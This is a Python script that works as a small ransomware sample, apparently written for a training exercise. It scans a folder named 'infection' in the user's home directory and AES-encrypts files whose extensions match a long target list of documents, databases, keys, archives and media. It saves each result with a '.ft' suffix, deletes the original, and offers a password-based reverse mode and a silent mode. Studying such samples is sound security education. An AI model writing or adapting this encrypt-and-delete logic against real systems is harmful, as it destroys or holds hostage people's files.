#!/usr/bin/env python3

import argparse
import os
import pyAesCrypt

p_green = "\033[32m" # verde
p_red = "\033[31m" # rojo
p_reset = "\033[0m"  # reset

extensions = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]
home = os.environ.get('HOME')

def check_passwd_len(arg):
    if len(arg) < 16:
        raise argparse.ArgumentTypeError("password must be min 16 characters")
    return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('password', type=check_passwd_len, help='password for encrypt/decrypt files (min 16 chars)')
    parser.add_argument('-r', '-reverse', action="store_true", help='reverse the infection')
    parser.add_argument('-s', '-silent', action="store_true", help='no output printed')
    parser.add_argument('-v', '-version', action='version', version='1.0')

    args = parser.parse_args()

    try:
        files = os.listdir(home + "/infection")

        for file in files:
            file = home + "/infection/" + file
            ext = ".ft"
            if (args.r):
                if os.path.splitext(file)[1] == ext:
                    try:
                        if os.path.exists(os.path.splitext(file)[0]) :
                            print(f"WARNING: can't decrypt {file} because {os.path.splitext(file)[0]} exists") if args.s == False else None
                        else :
                            pyAesCrypt.decryptFile(file, os.path.splitext(file)[0], args.password)
                            os.remove(file)
                            print(f"{file} {p_green}decrypted ->{p_reset} {os.path.splitext(file)[0]}") if args.s == False else None
                    except ValueError:
                        print(f"Wrong password") if args.s == False else None
                    except:
                        print(f"can't decrypt file {file}") if args.s == False else None
            else:
                if os.path.splitext(file)[1] in extensions:
                    try:
                        if os.path.exists(file + ext) :
                            print(f"WARNING: can't encrypt {file} because {file + ext} exists") if args.s == False else None
                        else :
                            pyAesCrypt.encryptFile(file, file + ext, args.password)
                            os.remove(file)
                            print(f"{file} {p_red}encrypted ->{p_reset} {file + ext}") if args.s == False else None
                    except:
                        print(f"can't encrypt file {file}") if args.s == False else None
    except FileNotFoundError:
         print("Error directory 'infection' not found")
         exit()
